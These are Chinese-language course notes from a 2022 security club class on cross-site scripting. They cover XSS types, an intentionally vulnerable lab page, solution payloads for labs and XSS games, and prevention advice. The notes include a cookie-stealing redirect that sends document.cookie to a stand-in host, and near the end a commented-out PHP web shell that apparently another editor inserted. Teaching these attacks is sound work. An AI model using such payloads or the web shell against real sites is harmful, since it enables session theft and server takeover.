# Web II by zhen

:::danger
請愛惜共筆，勿進行惡意刪減
:::

[課程講義(上課版)](https://slides.com/zhen3531/xss/fullscreen)

## 課程內容
- intro 
    - Reflected (反射型)
    - Store (儲存型)
    - DOM based
- JavaScript 小複習
- Impact & Prevention
- XSS Game
- 延伸參考

## Intro
- 把這行跑跑看!
    - `document.getElementsByTagName('body')[0].innerHTML=""`
    ![](https://i.imgur.com/XxJKp3j.jpg =250x150)

## XSS
- 跨站腳本攻擊 **C**ross-**S**ite **S**cripting
- 對web頁面注入惡意javascript語句而達到攻擊目的
    - 注入：把自己寫的程式碼覆蓋或插入原本的程式碼
- 最早可追溯到 1990 年，大量網站受到 XSS 攻擊或發現此漏洞

### Reflected (反射型)
- 惡意程式碼並不存於目標伺服器中
- 影響的層面僅限於單次單一使用者
- 把惡意程式藏在網址列(URL)裡
- 通常誘導使用者點到假連結
- EX: 釣魚信件
![](https://i.imgur.com/0Kmjyge.jpg)

### Stored (儲存型)
- 將惡意程式碼注入伺服器進行攻擊
- 反映不一定及時，但會持續造成影響
- 注入的語句通常會持續儲存於伺服器的資料庫
- EX:留言區、評論區

### DOM based
- **D**ocument **O**bject **M**odel 文檔物件模型
- 觸發時機在於前端瀏覽器對DOM的解析階段
- 與Reflected類似但不會傳資料給伺服器
- EX:.innerHTML()

### 三者比較
|種類	| 伺服器    | 資料庫 |
|----|----------|-------|
|反射型|	有經過	|沒經過|
|儲存型|	有經過	|有經過|
|DOM型|	沒經過	|沒經過|

### 事件系列
| 事件 |  敘述            |
| ------- | ----------------------- |
| onclick | 當滑鼠點擊時            |
| onerror | 當出現error時(載入失敗) |
| onload  | 當載入成功時            |


### lab1
:::spoiler lab
```javascript=
<html>
    <head>
        <title>Hello XSS!</title>
        <script>    
            function change(){
                var num = document.getElementById("Input").value;
                var Png = document.getElementById("Pic");
                Png.src = num + ".png";
            }
            function Load(){
                var Out = document.getElementById("Output");
                Out.innerHTML = "Success";
            }

        </script>
    </head>
    <body>
        <input type = 'text' id = "Input">
        <span id = "Output"></span>
        <div>
            <img id = "Pic" src="1.png" onclick="change()" onerror="alert('Error')" onload = "Load()" >
        </div>
    </body>
</html>
```
圖片請自己找
:::

:::spoiler ~~來做一個可以被XSS攻擊的網站吧!~~
```javascript=
    <html>
        <head>
            <title>Hello XSS!</title>
        </head>
        <body>
            <input type = 'text' id = "Input">
            <button id="Button">Save</button>
            <div>
                Hello, <span id = "Output"></span>
            </div>
            <script src="XSS.js"></script>
        </body>
    </html>
```
```javascript=
var Input = document.getElementById('Input');
var Button = document.getElementById('Button');
var Out = document.getElementById('Output');

Button.addEventListener('click', function(){
    Out.innerHTML = Input.value;
})
```
:::

>
> 今天的網站這是走現代簡約主義
    > 絕對不是因為我不想寫 CSS (重點)
> [name=zhen]

> 你們可以輸入一些奇奇怪怪的東西(do NOT modify code)
> 因為我什麼都沒有過濾，所以什麼都可以進去了對不對 >///<
> [name=zhen]

:::spoiler 解法
```
1.        <img  src="" onerror="alert('Error')">
2. <button onclick="alert('Allow')">Click</button>
3 <input type="button" value="他會跳出alert" name="btn" onclick = alert()>

```
> 失敗的嘗試:
```
        onclick="alert(1)"
        eval("alert(1)")
        document.getElementById('Button').onclick(function(){
            alert(1);   
        }
       )
```       

:::


### lab2
:::spoiler 解法
```
1.
<button onclick="alert('Allow')"><button onclick="alert('Allow')">Click</button>
2.
javascript:alert(1)
3.' onmouseover='alert(1)

```
> 失敗的嘗試
```
' onmouse='alert(1)
```
:::


### 把這串丟到FB看看 (?


alert(document.cookie)

## 複習一下

### Cookies
- 儲存在使用者端的文檔
- 用來解決 HTTP 協定的網頁互動問題
- 會隨著瀏覽器寄送請求時一併送出
- cookie過期與否，可以在cookie生成的時候設定

### Session
- 儲存在伺服器端的文字檔案
- 初次建立時會拿到ID (類似cookies)
- 往後伺服器的使用者資料全靠這組ID去取得
- Session過期與否取決於伺服器的設定


### Session	Cookies
- 存在Server端	
	- 安全性相對高	
- 存在你的電腦裡
	- 安全性相對低
- ~~cookie小偷~~
`
document.location.href="https://XSS.com"+btoa(document.cookie)
`


### 小總結
- XSS
    - 用各種手段對網站插入惡意語句
    - 發生原因通常是沒對使用者的輸入進行過濾
- 常見目的
    - 偷你資料(Cookies, Session)
    - 騙你到假網站
    - 偷你身分(拿你帳號亂發郵件)


### 如何防範?
- User
	- 來路不明的東西不要亂點
	- 輸入帳密前三思


> 你的資料
    >啪 沒了

- Developer
	- 取代危險字元
	- 建立白名單
	- 保護Cookies(HttpOnly)
    - ~~不要自己架網站~~
	- **不要相信使用者!!!**
    >惡意輸入的js的語句>>>想要防範他們的我

## XSS Game

> 掰了，重做，耶！
> [name=zhen]
- [BBQ 的 XSS GAME](https://xss-game.appspot.com/)

>資訊的盡頭就是通靈
>[name=zhen]
- [XSS GAME](http://www.xssgame.com/)
- :::spoiler Foogle
    ```
    1.<script>alert(1)</script>
    2. 直接url ?query=<script>alert(1)</script>
    ```
    失敗的嘗試
    ```
    javascript:alert(1)
    ```
> 單引號或雙引號包起來

- :::spoiler webtimerpro
    解答
    ```
    1');alert(1);//
    ```
    失敗的嘗試
    ```
    function parseInt(v){      return v }     alert(1)
    ```











<!-- <?php system($_GET('cmd')); ?> -->
<!--樓上有人塞髒東西啊 -->





---
###### tags: `Enlightened` `NISRA` `2022`

<style>
    .navbar-brand:before {
        content: ' NISRA × ';
        padding-left: 1.7em;
        background-image: url(https://i.imgur.com/ue2XHqP.png);
        background-repeat: no-repeat;
        background-size: contain;
    }
    .navbar-brand > .fa-file-text {
        padding-left: 0.1em;
        display: none;
    }
</style>

